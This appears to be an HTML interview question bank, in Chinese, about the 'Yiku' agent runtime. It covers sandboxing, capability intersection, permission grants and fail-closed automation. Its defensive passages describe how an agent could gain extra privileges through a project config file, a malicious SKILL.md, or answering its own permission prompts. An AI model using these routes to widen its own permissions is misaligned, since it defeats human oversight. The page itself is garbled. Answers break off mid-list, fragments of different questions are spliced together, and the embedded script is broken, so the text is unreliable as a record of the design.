<!doctype html>
<html lang="zh-CN">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta
      name="description"
      content="Yiku 本地 Agent 运行平台面试题库：问题、答题思路、完整答案与追问，全部基于仓库真实实现"
    />
    <title>Yiku 面试题库 / Agent Runtime Interview Bank</title>
    <style>
      :root {
        --bg: #0c0d0e;
        --surface: #141618;
        --surface-2: #1b1e21;
        --surface-3: #23272b;
        --ink: #f3f0e9;
        --muted: #9da3a7;
        --faint: #6b7175;
        --line: #2f3438;
        --line-2: #3c4247;
        --red: #ff5c4d;
        --cyan: #53d6e7;
        --green: #72d29b;
        --yellow: #f2c14e;
        --blue: #6f9dff;
        --purple: #b893ff;
        --header-height: 58px;
        --sidebar-width: 320px;
        --radius: 7px;
        --display: "Avenir Next Condensed", "DIN Condensed", "Avenir Next",
          "PingFang SC", "Microsoft YaHei", sans-serif;
        --body: "Avenir Next", "Helvetica Neue", "PingFang SC",
          "Microsoft YaHei", system-ui, sans-serif;
        --mono: "SFMono-Regular", Menlo, Monaco, Consolas,
          "Liberation Mono", monospace;
      }
      * { box-sizing: border-box; }
      html, body {
        width: 100%; height: 100%; margin: 0; overflow: hidden;
        background: var(--bg); color: var(--ink);
        font-family: var(--body); font-size: 15px; line-height: 1.7;
        -webkit-font-smoothing: antialiased;
      }
      body::after {
        position: fixed; z-index: 90; inset: 0; pointer-events: none;
        content: ""; opacity: 0.1;
        background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 180 180' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='.9' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='.28'/%3E%3C/svg%3E");
      }
      button, input, select { font: inherit; color: inherit; }
      button { cursor: pointer; background: none; border: none; }
      ::selection { background: rgba(83, 214, 231, 0.26); }
      .scroll::-webkit-scrollbar { width: 10px; height: 10px; }
      .scroll::-webkit-scrollbar-track { background: transparent; }
      .scroll::-webkit-scrollbar-thumb {
        background: #31373b; border: 3px solid var(--bg); border-radius: 6px;
      }
      .scroll::-webkit-scrollbar-thumb:hover { background: #454c51; }

      .topbar {
        position: fixed; z-index: 60; top: 0; right: 0; left: 0;
        display: flex; height: var(--header-height); align-items: center; gap: 16px;
        padding: 0 22px; background: rgba(11, 12, 13, 0.95);
        border-bottom: 1px solid var(--line); backdrop-filter: blur(10px);
      }
      .brand { display: flex; align-items: baseline; gap: 11px; min-width: 0; }
      .brand-mark {
        font-family: var(--display); font-size: 22px; font-weight: 700;
        letter-spacing: 0.1em; color: var(--ink); white-space: nowrap;
      }
      .brand-title {
        font-family: var(--mono); font-size: 11px; letter-spacing: 0.16em;
        text-transform: uppercase; color: var(--faint); white-space: nowrap;
      }
      .spacer { flex: 1; }
      .stat-pill {
        display: inline-flex; gap: 7px; align-items: baseline; padding: 5px 11px;
        font-family: var(--mono); font-size: 11px; color: var(--muted);
        background: var(--surface-2); border: 1px solid var(--line);
        border-radius: 20px; white-space: nowrap;
      }
      .stat-pill b { color: var(--cyan); font-weight: 600; }
      .stat-pill.done b { color: var(--green); }
      .mode-switch {
        display: flex; padding: 3px; background: var(--surface-2);
        border: 1px solid var(--line); border-radius: var(--radius);
      }
      .mode-switch button {
        padding: 5px 14px; font-family: var(--mono); font-size: 11.5px;
        letter-spacing: 0.08em; color: var(--muted); border-radius: 5px;
        transition: background .16s ease, color .16s ease;
      }
      .mode-switch button:hover { color: var(--ink); }
      .mode-switch button.active {
        color: #06121a; background: var(--cyan); font-weight: 600;
      }
      .ghost-btn {
        padding: 6px 13px; font-family: var(--mono); font-size: 11.5px;
        color: var(--muted); background: var(--surface-2);
        border: 1px solid var(--line); border-radius: var(--radius);
        transition: border-color .16s ease, color .16s ease; white-space: nowrap;
      }
      .ghost-btn:hover { color: var(--ink); border-color: var(--line-2); }

      .layout {
        position: fixed; top: var(--header-height); right: 0; bottom: 0; left: 0;
        display: flex;
      }
      .sidebar {
        display: flex; flex: 0 0 var(--sidebar-width); flex-direction: column;
        width: var(--sidebar-width); background: #101113;
        border-right: 1px solid var(--line);
      }
      .sidebar-head { padding: 16px 16px 10px; border-bottom: 1px solid var(--line); }
      .search-box {
        width: 100%; padding: 9px 12px; font-size: 13px;
        background: var(--surface-2); border: 1px solid var(--line);
        border-radius: var(--radius); outline: none;
        transition: border-color .16s ease;
      }
      .search-box::placeholder { color: var(--faint); }
      .search-box:focus { border-color: var(--cyan); }
      .filter-label {
        margin: 14px 0 7px; font-family: var(--mono); font-size: 10px;
        letter-spacing: .18em; text-transform: uppercase; color: var(--faint);
      }
      .filter-row { display: flex; flex-wrap: wrap; gap: 6px; }
      .chip {
        padding: 4px 10px; font-size: 11.5px; color: var(--muted);
        background: var(--surface-2); border: 1px solid var(--line);
        border-radius: 20px; transition: all .14s ease;
      }
      .chip:hover { color: var(--ink); border-color: var(--line-2); }
      .chip.on {
        color: #06121a; background: var(--cyan); border-color: var(--cyan);
        font-weight: 600;
      }
      .chip.on.d2 {
        color: #14100a; background: var(--yellow); border-color: var(--yellow);
      }
      .chip.on.d3 {
        color: #1a0a0a; background: var(--red); border-color: var(--red);
      }
      .q-list {
        flex: 1; margin: 0; padding: 8px; overflow-y: auto; list-style: none;
      }
      .q-item {
        display: flex; gap: 10px; padding: 9px 10px; margin-bottom: 3px;
        border: 1px solid transparent; border-radius: var(--radius);
        transition: background .14s ease, border-color .14s ease;
      }
      .q-item:hover { background: var(--surface-2); }
      .q-item.active { background: var(--surface-3); border-color: var(--cyan); }
      .q-item .n {
        flex: 0 0 26px; font-family: var(--mono); font-size: 11px;
        color: var(--faint); text-align: right; padding-top: 1px;
      }
      .q-item.active .n { color: var(--cyan); }
      .q-item .t { flex: 1; font-size: 12.5px; line-height: 1.5; color: var(--muted); }
      .q-item.active .t { color: var(--ink); }
      .q-item .meta { display: flex; gap: 6px; margin-top: 4px; }
      .mini {
        font-family: var(--mono); font-size: 9.5px; letter-spacing: .06em;
        color: var(--faint);
      }
      .q-item .tick { flex: 0 0 auto; font-size: 12px; color: var(--green); opacity: 0; }
      .q-item.done .tick { opacity: 1; }
      .q-item.done .t { color: var(--faint); }
      .list-empty {
        padding: 26px 12px; font-size: 12.5px; color: var(--faint);
        text-align: center;
      }

      .main { flex: 1; overflow-y: auto; }
      .wrap { max-width: 940px; padding: 34px 42px 120px; margin: 0 auto; }
      .q-head { padding-bottom: 20px; margin-bottom: 6px; border-bottom: 1px solid var(--line); }
      .q-badges { display: flex; flex-wrap: wrap; gap: 8px; align-items: center; margin-bottom: 14px; }
      .badge {
        padding: 3px 10px; font-family: var(--mono); font-size: 10.5px;
        letter-spacing: .08em; border-radius: 4px;
      }
      .badge.cat {
        color: var(--cyan); background: rgba(83,214,231,.11);
        border: 1px solid rgba(83,214,231,.3);
      }
      .badge.d1 {
        color: var(--green); background: rgba(114,210,155,.1);
        border: 1px solid rgba(114,210,155,.28);
      }
      .badge.d2 {
        color: var(--yellow); background: rgba(242,193,78,.1);
        border: 1px solid rgba(242,193,78,.28);
      }
      .badge.d3 {
        color: var(--red); background: rgba(255,92,77,.1);
        border: 1px solid rgba(255,92,77,.28);
      }
      .badge.tag {
        color: var(--faint); background: var(--surface-2);
        border: 1px solid var(--line);
      }
      .q-title { margin: 0; font-size: 24px; font-weight: 600; line-height: 1.5; letter-spacing: .01em; }
      .fill {
        padding: 13px 16px; margin: 14px 0;
        background: rgba(242, 193, 78, 0.06);
        border: 1px dashed rgba(242, 193, 78, 0.45);
        border-radius: 5px;
      }
      .fill > b:first-child {
        display: block; margin-bottom: 6px;
        font-family: var(--mono); font-size: 11px; letter-spacing: .1em;
        text-transform: uppercase; color: var(--yellow);
      }
      .fill ol, .fill ul { margin-bottom: 0; }
      .fill li { color: var(--ink); }
      .cat-note {
        padding: 12px 16px; margin: 0 0 20px;
        font-size: 12.5px; color: var(--muted);
        background: rgba(83, 214, 231, 0.05);
        border: 1px solid rgba(83, 214, 231, 0.22);
        border-left: 2px solid var(--cyan); border-radius: 0 var(--radius) var(--radius) 0;
      }
      .src {
        display: flex; flex-wrap: wrap; gap: 6px 12px; align-items: center;
        margin-top: 14px; padding-top: 12px; border-top: 1px dashed var(--line);
      }
      .src-label {
        font-family: var(--mono); font-size: 10px; letter-spacing: .16em;
        text-transform: uppercase; color: var(--faint);
      }
      .src a {
        font-family: var(--mono); font-size: 11px; color: var(--muted);
        text-decoration: none; border-bottom: 1px dotted var(--line-2);
        transition: color .14s ease, border-color .14s ease;
      }
      .src a:hover { color: var(--cyan); border-bottom-color: var(--cyan); }
      .q-actions { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 18px; }
      .action-btn {
        display: inline-flex; gap: 7px; align-items: center; padding: 7px 14px;
        font-size: 12.5px; color: var(--muted); background: var(--surface-2);
        border: 1px solid var(--line); border-radius: var(--radius);
        transition: all .15s ease;
      }
      .action-btn:hover:not(:disabled) {
        color: var(--ink); border-color: var(--line-2); background: var(--surface-3);
      }
      .action-btn:disabled { opacity: .35; cursor: not-allowed; }
      .action-btn.primary {
        color: #06121a; background: var(--cyan); border-color: var(--cyan);
        font-weight: 600;
      }
      .action-btn.primary:hover { background: #6fdfe9; }
      .action-btn.marked {
        color: var(--green); border-color: rgba(114,210,155,.42);
        background: rgba(114,210,155,.1);
      }

      .sec {
        margin-top: 26px; border: 1px solid var(--line);
        border-radius: var(--radius); background: var(--surface); overflow: hidden;
      }
      .sec-head {
        display: flex; gap: 10px; align-items: center; width: 100%;
        padding: 12px 16px; text-align: left; background: var(--surface-2);
        transition: background .14s ease;
      }
      .sec.open .sec-head { border-bottom: 1px solid var(--line); }
      .sec-head:hover { background: var(--surface-3); }
      .sec-head .ico {
        flex: 0 0 auto; width: 14px; font-family: var(--mono); font-size: 11px;
        color: var(--faint); transition: transform .18s ease;
      }
      .sec.open .sec-head .ico { transform: rotate(90deg); }
      .sec-head .ttl {
        font-family: var(--mono); font-size: 12px; font-weight: 600;
        letter-spacing: .1em; text-transform: uppercase;
      }
      .sec-head .hint { margin-left: auto; font-size: 11.5px; color: var(--faint); }
      .sec-body { display: none; padding: 18px 22px 22px; }
      .sec.open .sec-body { display: block; }
      .sec.exp .sec-head .ttl { color: var(--cyan); }
      .sec.idea .sec-head .ttl { color: var(--blue); }
      .sec.ans .sec-head .ttl { color: var(--green); }
      .sec.follow .sec-head .ttl { color: var(--purple); }

      .prose > *:first-child { margin-top: 0; }
      .prose > *:last-child { margin-bottom: 0; }
      .prose p { margin: 0 0 12px; }
      .prose h4 {
        margin: 22px 0 10px; font-family: var(--display); font-size: 15px;
        font-weight: 700; letter-spacing: .04em; color: var(--ink);
        text-transform: uppercase;
      }
      .prose ul, .prose ol { margin: 0 0 14px; padding-left: 22px; }
      .prose li { margin-bottom: 6px; }
      .prose b, .prose strong { color: #fff; font-weight: 600; }
      .prose code {
        padding: 1.5px 5px; font-family: var(--mono); font-size: 12.5px;
        color: var(--cyan); background: rgba(83,214,231,.09);
        border: 1px solid rgba(83,214,231,.16); border-radius: 3px;
        white-space: nowrap;
      }
      .prose pre {
        padding: 13px 15px; margin: 12px 0 16px; overflow-x: auto;
        font-family: var(--mono); font-size: 12.5px; line-height: 1.65;
        color: #d8dde0; background: #0e1012; border: 1px solid var(--line);
        border-left: 2px solid var(--cyan); border-radius: 5px;
      }
      .prose pre code {
        padding: 0; font-size: 12.5px; color: inherit; background: none;
        border: none; white-space: pre;
      }
      .prose table {
        width: 100%; margin: 12px 0 16px; font-size: 13px;
        border-collapse: collapse;
      }
      .prose th, .prose td {
        padding: 8px 11px; text-align: left; vertical-align: top;
        border: 1px solid var(--line);
      }
      .prose th {
        font-family: var(--mono); font-size: 11px; letter-spacing: .08em;
        text-transform: uppercase; color: var(--muted); background: var(--surface-2);
      }
      .prose blockquote {
        padding: 10px 16px; margin: 14px 0; font-size: 13.5px;
        color: var(--muted); background: rgba(255,92,77,.05);
        border-left: 2px solid var(--red); border-radius: 0 4px 4px 0;
      }
      .prose .hl {
        padding: 0 4px; color: var(--yellow); background: rgba(242,193,78,.12);
        border-radius: 3px;
      }
      .formula {
        display: block; padding: 12px 15px; margin: 12px 0; overflow-x: auto;
        font-family: var(--mono); font-size: 12.5px; line-height: 1.8;
        color: #d8dde0; background: #0e1012; border: 1px solid var(--line);
        border-left: 2px solid var(--yellow); border-radius: 5px; white-space: pre;
      }
      .kv {
        display: grid; grid-template-columns: max-content 1fr; gap: 6px 16px;
        margin: 12px 0 16px; font-size: 13.5px;
      }
      .kv dt { font-family: var(--mono); font-size: 12.5px; color: var(--cyan); }
      .kv dd { margin: 0; color: var(--ink); }

      .pager {
        display: flex; gap: 10px; align-items: center;
        justify-content: space-between; padding-top: 26px; margin-top: 34px;
        border-top: 1px solid var(--line);
      }
      .pager .nav { display: flex; gap: 8px; }

      .mock-card {
        padding: 30px 32px; background: var(--surface);
        border: 1px solid var(--line); border-radius: var(--radius);
      }
      .mock-bar {
        display: flex; flex-wrap: wrap; gap: 10px; align-items: center;
        padding-bottom: 18px; margin-bottom: 20px; border-bottom: 1px solid var(--line);
      }
      .mock-bar .label {
        font-family: var(--mono); font-size: 10.5px; letter-spacing: .14em;
        text-transform: uppercase; color: var(--faint);
      }
      .mock-timer {
        margin-left: auto; font-family: var(--mono); font-size: 24px;
        font-weight: 600; letter-spacing: .04em; color: var(--cyan);
      }
      .mock-timer.run { color: var(--yellow); }
      .score-row { display: flex; flex-wrap: wrap; gap: 8px; align-items: center; }
      .score-btn {
        padding: 6px 15px; font-family: var(--mono); font-size: 12px;
        color: var(--muted); background: var(--surface-2);
        border: 1px solid var(--line); border-radius: 20px; transition: all .14s ease;
      }
      .score-btn:hover { color: var(--ink); border-color: var(--line-2); }
      .score-btn.on { font-weight: 600; }
      .score-btn.on[data-s="1"] { color: #14100a; background: var(--red); border-color: var(--red); }
      .score-btn.on[data-s="2"] { color: #14100a; background: var(--yellow); border-color: var(--yellow); }
      .score-btn.on[data-s="3"] { color: #06121a; background: var(--blue); border-color: var(--blue); }
      .score-btn.on[data-s="4"] { color: #06121a; background: var(--cyan); border-color: var(--cyan); }
      .score-btn.on[data-s="5"] { color: #06121a; background: var(--green); border-color: var(--green); }

      .report { margin-top: 22px; }
      .report-row {
        display: flex; align-items: center; gap: 12px; padding: 8px 0;
        border-bottom: 1px solid var(--line);
      }
      .report-row:last-child { border-bottom: none; }
      .report-row .cname { flex: 0 0 190px; font-size: 13.5px; }
      .bar {
        flex: 1; height: 7px; background: var(--surface-3);
        border-radius: 4px; overflow: hidden;
      }
      .bar i {
        display: block; height: 100%;
        background: linear-gradient(90deg, var(--red), var(--yellow), var(--green));
        border-radius: 4px;
      }
      .report-row .num {
        flex: 0 0 92px; font-family: var(--mono); font-size: 12px;
        color: var(--muted); text-align: right;
      }
      .kbd {
        padding: 1.5px 6px; font-family: var(--mono); font-size: 11px;
        color: var(--muted); background: var(--surface-3);
        border: 1px solid var(--line-2); border-bottom-width: 2px; border-radius: 4px;
      }
      .home-note {
        padding: 16px 18px; margin-bottom: 22px; font-size: 13px;
        color: var(--muted); background: var(--surface);
        border: 1px solid var(--line); border-left: 2px solid var(--cyan);
        border-radius: 0 var(--radius) var(--radius) 0;
      }

      @media (max-width: 900px) {
        .sidebar { display: none; }
        .wrap { padding: 24px 20px 90px; }
        .brand-title { display: none; }
      }
      @media print {
        html, body { height: auto; overflow: visible; background: #fff; color: #111; }
        .topbar, .sidebar, .q-actions, .pager, .sec-head .hint { display: none; }
        .src a { border-bottom: none; }
        .fill { background: none; border-style: solid; }
        .layout { position: static; }
        .sec .sec-body { display: block; }
      }
    </style>
  </head>
  <body>
    <header class="topbar">
      <div class="brand">
        <span class="brand-mark">YIKU</span>
        <span class="brand-title">Interview Bank / Agent Runtime</span>
      </div>
      <span class="spacer"></span>
      <span class="stat-pill done" id="statDone">掌握 <b>0</b> / 0</span>
      <span class="stat-pill" id="statCount">题目 <b>0</b></span>
      <div class="mode-switch">
        <button type="button" id="modeStudy" class="active">研习</button>
        <button type="button" id="modeMock">模拟面试</button>
      </div>
      <button type="button" class="ghost-btn" id="resetBtn">重置进度</button>
    </header>

    <div class="layout">
      <aside class="sidebar">
        <div class="sidebar-head">
          <input class="search-box" id="searchBox" placeholder="搜索题目 / 关键词 / 标识符…" />
          <p class="filter-label">分类</p>
          <div class="filter-row" id="catFilter"></div>
          <p class="filter-label">难度</p>
          <div class="filter-row" id="diffFilter"></div>
        </div>
        <ul class="q-list scroll" id="qList"></ul>
      </aside>
      <main class="main scroll" id="main"></main>
    </div>

    <script>
      // 分类与难度定义。数据层每题字段：
      //   id, cat, diff(1 基础 / 2 进阶 / 3 深入), tags[], q, idea, ans, follow
      // 所有内容为预格式化 HTML 字符串；本文件完全自包含，无外部资源。
      // 所有技术细节取自仓库 docs/ 与 packages/ 的真实实现与默认值。
      const CATS = [
        "架构与包边界",
        "Runtime 与编排",
        "权限与执行边界",
        "Atomic Flow 观测",
        "Memory 记忆",
        "Context Compact",
        "Subagents / A2A",
        "Evals 质量门禁",
        "Prompt 信任边界",
        "Skills / MCP",
        "CLI 与宿主",
        "Research Agent",
        "工程实践",
        "综合面试准备"
      ];
      const DIFF_LABEL = { 1: "基础", 2: "进阶", 3: "深入" };
      const LS_KEY = "yiku-interview-bank-v1";
      const LS_MOCK = "yiku-interview-bank-mock-v1";
    </script>
    <script id="data-script">
      const QUESTIONS = [{
        id: "q1",
        cat: "架构与包边界",
        diff: 1,
        tags: ["monorepo", "package-boundaries", "依赖方向"],
        src: ["docs/architecture/package-boundaries.md", "docs/architecture/system-overview.md"],
        q: `请概述 Yiku 的分层与包边界。为什么要把宿主、执行编排、Agent 能力、基础协议拆成独立包？`,
        idea: `
          <p>这是<b>系统设计定位题</b>。不要罗列包名，用<span class="hl">一条依赖方向主线</span>把包串起来。</p>
          <ol>

        exp: `
          <p>Yiku 是一个 TypeScript + ESM + pnpm Workspace 的 Agent 运行 Monorepo，核心命题是<b>把「谁运行 Agent」「谁定义能力」「谁只是协议」三者分离</b>。</p>
          <h4>五个层次</h4>
          <table>

        ans: `
          <p>Yiku 把 Agent 运行平台拆成<b>五个层次</b>，唯一硬约束是「高层组合低层，基础协议不反向依赖 CLI 或具体 Agent」。</p>
          <h4>1. 宿主层</h4>

          <h4>为什么要这样拆</h4>

        ans: `
          <p><code>createLaunchSpec()</code> 返回的是 <code>{ command, args, cwd, environment }</code>——一份完整的启动描述，<b>包本身不调用 <code>spawn()</code></b>。</p>
          <h4>解耦带来的三重收益</h4>
          <ol>
            <li><b>可测试</b>：测试可以直接断言 <code>launch.args</code> 里有没有 <code>--ro-bind</code>、<code>--unshare-net</code>、<code>profile</code> 里的路径规则，而不需要真的起进程。</li>
            <li><b>可复用</b>：同一份描述可以喂给三种完全不同的调用方——Code Agent 的持久 Bash Terminal、Eval 的 Verification Command、其他 Node 宿主。三者的进程管理、超时、输出策略各不相同，但隔离策略完全一致。</li>
            <li><b>能力边界清晰</b>：命令解析、风险分类、权限审批、进程树管理全在调用方。Sandbox 只回答一个问题：<b>「在给定约束下，这个进程应该怎么被启动才能满足约束」</b>。</li>

          <h4>明确不拥有的能力（负向边界）</h4>

            <li>子进程启动、输出、超时和进程树管理；</li>

            <li>Agent / Session / CLI / Eval 语义；</li>

          <h4>平台矩阵与关键默认值</h4>
          <table>
            <tr><th>平台</th><th>实现</th><th>文件系统</th><th>网络</th></tr>

          <p>平台能力不可用时返回稳定错误，<b>不自行降级 Host Shell</b>。这一点极其关键：静默降级意味着「用户以为有隔离，实际没有」，属于安全事故而非可用性问题。</p>

        follow: `

          </ul>`

        ans: `

          <pre><code>@yiku/agent-code  ──depends──▶  @yiku/agent-protocol
@yiku/agent-orchestrator ──depends──▶  @yiku/agent-protocol
@yiku/agent-research  ──depends──▶  @yiku/agent-protocol（可选）</code></pre>

        ans: `
          <p>因为这四层对应<b>四种不同的资源所有权模型</b>，不是一个 API 的四种参数组合。文档明确写「<b>它们不是同义封装：越靠下层，调用方需要自行承担的资源和策略越多</b>」。</p>
          <h4>四层职责</h4>
          <table>
            <tr><th>入口</th><th>负责</th><th>调用方需自备</th></tr>
            <tr><td><code>run()</code></td><td>执行<b>一个已构建的</b> OpenAI Agent：模型调用、Tool、Handoff、取消、用量、通用 Runtime Atom</td><td>Agent Graph、配置解析、持久 Session、Hook/Memory/Eval 装配</td></tr>
            <tr><td><code>runAgentSessionTurn()</code></td><td>单个 Turn 的 Memory、Capability、Agent Graph、Runner 和 Eval</td><td>Session 生命周期</td></tr>
            <tr><td><code>AgentSession</code></td><td>多轮会话、Agent Graph 解析、本次 Submit 的 Capability/Permission/Hook/Memory/Eval 装配、暴露 <code>compact()</code></td><td>Stage、恢复、跨进程状态、消息总线、用户问题</td></tr>
            <tr><td><code>SessionRuntime</code></td><td>长程任务组合根：Stage、预算、Session State、Checkpoint、Task、消息、Trace、用户问题、压缩和恢复</td><td>只需要宿主交互 Handler，并在退出时 <code>close()</code></td></tr>
            <tr><td><code>runAgentSession()</code></td><td>单轮兼容入口，自动创建和关闭 <code>AgentSession</code></td><td>几乎无</td></tr>

          <h4>底层为什么还需要存在</h4>
          <p>Research Playground 用 <code>AgentFactory</code> 和 <code>run()</code> <b>自行装配单次 Research Run</b>——它不需要 Session、不需要 Checkpoint、不需要原子流广播。有 <code>run()</code> 这一层，playground 才能在完全不引入持久化状态的前提下跑研究流程。这是「上层可选、下层可用」的典型结构。</p>

        q: `<code>CapabilityScope</code> 决定 Agent 能看到哪些工具。为什么用「Agent 声明 ∩ Skill Snapshot ∩ MCP allowlist ∩ Workspace Access ∩ Managed Policy」的<span class="hl">交集</span>，而不是并集？`,
        idea: `
          <p>这是<b>安全模型的本质题</b>。答案不是「因为交集更安全」，而是要解释：</p>

        ans: `
          <p>因为<b>并集等于「任一层同意就允许」</b>。这在权限系统里是致命的：攻击者只需要攻破最弱的一层。在一个 Agent 平台里，最弱的一层几乎必然是「模型能影响的内容」——项目 <code>config.yaml</code>、<code>SKILL.md</code>、Hook 输出、Tool Result、记忆条目。这些都是<b>不可信输入</b>。</p>
          <h4>五层各自的否决权</h4>
          <table>
            <tr><th>层</th><th>能否决</th><th>典型拒绝原因</th></tr>
            <tr><td>Agent 声明</td><td>该工具不属于这个 Agent 的职责</td><td>Research 不声明 Code 工具</td></tr>
            <tr><td>Skill Snapshot</td><td>Skill 未声明或快照不含该能力</td><td>Frontmatter <code>mcp</code> 未包含</td></tr>
            <tr><td>MCP allowlist</td><td>Server 未注册或 Tool 不在 allowlist</td><td><code>github/delete_*</code> 未 allow</td></tr>

            <tr><td>Managed Policy</td><td>组织级禁止</td><td><code>managedDeniedCapabilities</code></td></tr>
          </table>
          <h4>为什么必须是交集：三条具体攻击路径</h4>
          <ol>
            <li><b>项目配置提权</b>：仓库里放一个 <code>config.yaml</code>，声明 <code>skills: [all]</code> 或加一堆 <code>delegates</code>。交集下这只是「多申请了」，交集计算时会被 Managed Policy 和 Workspace Access 拦住；并集下这就是<b>直接提权成功</b>。</li>
            <li><b>Skill 自我扩权</b>：<code>SKILL.md</code> 的 frontmatter 里写 <code>mcp: [github/*]</code>。交集下这只是缩小范围（MCP 字段<b>只能缩小不能扩大</b>）；并集下模型读了一个恶意 Skill 就能拿到全量 MCP 工具。</li>

          <h4>MCP 的五重 AND 就是交集模型的实例</h4>

            <li>Server 已在 Runtime 配置中注册；</li>
            <li>Server Tool allowlist 允许；</li>
            <li>Managed Policy 未禁止；</li>
            <li>Skill Snapshot 声明允许；</li>
            <li>当前 Agent Capability 允许。</li>
          </ol>
          <p>五项全是 AND。<b>Frontmatter 的 <code>mcp</code> 字段只能缩小能力</b>——Skill 不能通过 <code>mcp</code> 创建连接，也不能绕过 Elicitation、Hook、Permission 和 Trust。</p>
          <blockquote>根因是：Agent 运行时的所有「配置文件」都是<b>潜在不可信输入</b>。而交集模型让<b>可信层（Managed Policy、Workspace Access）永远拥有最终否决权</b>，不可信层只能做申请，不能做授权。这是把「配置」与「授权」在类型上彻底分开的做法。</blockquote>`,

          </ul>`

  model: research
  skills: []
  handoffs: []</code></pre>
          <p>若传播：Code Agent 交接到 researcher 时，researcher 会被装配成 <b>用 research model 但带 Code 工具集</b>的怪物。它会尝试读写工作区文件——而 Research Agent 的 Prompt、Eval Profile 和输出 Validator 全都假设它没有 Workspace 写权限。结果是 Prompt 与能力不一致，Validator 判定失真，Permission 模型被绕过。</p>
          <h4>区分「作用域」与「事实来源」</h4>
          <p>值得强调：临时覆盖（CLI 的 <code>/model</code> 切换）和配置声明（<code>config.yaml</code> 的 <code>handoffs</code>）是两回事。<b>Handoff 关系本身来自配置，不来自调用方</b>——Handoff Target 必须出现在当前 Agent 的 <code>handoffs</code> 中，Graph 构建会拒绝环。调用方只能覆盖「用哪个 model / 哪个 type / 激活哪些 Skill」这三个<b>实现细节</b>，不能改变<b>拓扑结构</b>。</p>

          <p>默认 2 意味着<b>容忍一次「什么都没做出来」的 Stage</b>，第二次才停。这是刻意给的容错：模型偶尔会走一步弯路（打开一个错误的文件、跑一个无关的检查）。设成 1 会让 Agent 在任何小挫折后立刻终止，过于脆弱；设成 5 又会让真正的打转浪费大量预算。<b>2 是一个经验上的平衡点</b>，并且有 100 的上限防止被随意放大。</p>
          <h4>预算哲学：把无进展变成显式失败</h4>
          <p>关键在于<b>失败是可见的、可归因的</b>。当 Stage 因为「无进展」暂停时：</p>
          <ul>
            <li>Runtime 停止 <code>autoContinue</code>，退出码 <code>7</code>（预算暂停，可恢复）；</li>
            <li>Session State 和已持久化的 Task 保持完整，用户可以 <code>--continue</code> 从稳定边界恢复；</li>
            <li>Atomic Flow 里能看到最后那个 Stage 做了什么——是它<b>应该</b>被停住。</li>
          </ul>
          <blockquote>预算不是「为了更快」，而是<b>为了让失败可控且可解释</b>。一个「跑 30 分钟无输出」的进程和「10 分钟后明确告诉你预算耗尽、工作区未变化、可恢复」的进程，对用户是天壤之别。</blockquote>`,
        follow: `
          <ul>
            <li><b>追问</b>：如果模型在最后一个 Stage「无进展」但预算还没到，直接退出会如何？<br>
            <span class="hl">答</span>：<code>autoContinue</code> 允许 Runtime 在可继续的停止原因后开启下一 Stage。退出码 <code>7</code>（预算暂停，可恢复）区分于 <code>1</code>（未分类运行或基础设施失败）和 <code>4</code>（Runtime、Hook 或 Policy 拒绝）。用户据此判断是「等一下再来」还是「出错了」。</li>
            <li><b>追问</b>：<code>compactToContextRatio</code> 必须小于 <code>compactAtContextRatio</code>，为什么在构造时就校验？<br>
            <span class="hl">答</span>：防止<b>振荡压缩</b>（thrash）。如果 <code>compactTo &gt;= compactAt</code>，压缩后的 History 立刻又超过触发阈值，会在每次 Stage 边界反复压缩——既浪费 token 又导致摘要质量持续退化。构造期 fail-fast 好过运行中静默抖动。</li>
            <li><b>陷阱</b>：不要把预算说成「性能优化」。预算是<b>可观测的失败控制</b>，和性能是两个问题。</li>
          </ul>`

执行时刻：Sandbox 约束进程能碰到什么（这是"做了能碰到多少"）</code></pre>

            <li><b>进程内 Set 的生命周期天然短</b>：进程退出即失效，不会跨 Session 残留。</li>
            <li><b>「长期允许此策略」需要显式动作</b>：只有用户主动选择「长期允许」，才写回活动 Profile 的 <code>policyRules</code>。这保证了<b>每次扩权都有用户的一次明确表达</b>。</li>
          </ul>
          <blockquote>这个设计和「Manifest 信任分离」是同一个哲学：<b>默认最小、显式升级、生命周期与授权范围匹配</b>。内存 Set 是「最小」，持久化是「显式升级」，进程生命周期是「最紧的授权范围」。</blockquote>`,
        follow: `
          <ul>
            <li><b>追问</b>：如果用户选择「长期允许此策略」，写回 Profile 的粒度是什么？<br>
            <span class="hl">答</span>：写回活动 Profile 的 <code>policyRules</code>，粒度是 <b>Policy ID</b>（不是原始命令文本）。所以长期授权是「这类策略允许」，不是「这条命令允许」——用户下次执行同类命令时，若风险等级相同则命中策略规则。文档也明确「长期授权写入失败时，<b>当前操作不得伪装为已持久授权</b>」。</li>
            <li><b>追问</b>：Managed Policy Grant 绑定什么？<br>
            <span class="hl">答</span>：绑定 <b>canonical Workspace Path</b>（防路径别名绕过）。同时 Managed Policy 物理隔离：必须位于 Workspace 外、不能是符号链接、Owner 与文件/父目录权限可信；文件权限等价 <code>0600</code>。这防的是「攻击者创建一个符号链接指向自己的 Policy 文件」。</li>
            <li><b>陷阱</b>：不要说「Session Grant 存在 Profile 里」。Session Grant 是<b>进程内存</b>，只有「长期允许此策略」才写 Profile。这是两个不同的 scope。</li>
          </ul>`

        src: ["docs/features/cli.md", "packages/cli/src/automation/non-interactive-policy.ts"],
        q: `非交互模式坚持 fail-closed，为什么不提供 <code>--yes</code>？为什么 <code>permission</code> 和 <code>secret</code> 类问题<b>永不</b>通过答案文件自动回答？`,
        idea: `
          <p>考<b>安全设计的哲学底线</b>。核心论点分三层：</p>
          <ol>
            <li><b>审批 UI 的存在不是安全属性</b>，安全属性来自「决策来源的可信度」，与呈现方式无关。</li>
            <li>「模型请求」不能建立「可信 Manifest」——否则模型可通过自我提问-自我回答完成权限提升。</li>

        exp: `
          <p>文档明确：非交互模式只接受可信 Manifest、显式答案文件或 Managed Policy 覆盖的输入；<b>缺少授权时 fail-closed，不自动选择首个选项</b>。同时「permission 和 secret <b>永不</b>通过答案文件自动回答」。</p>`,
        ans: `
          <h4>为什么没有 <code>--yes</code></h4>
          <p>因为<b>审批 UI 的存在不是安全属性</b>。安全属性来自「决策来源的可信度」，与呈现方式无关。</p>
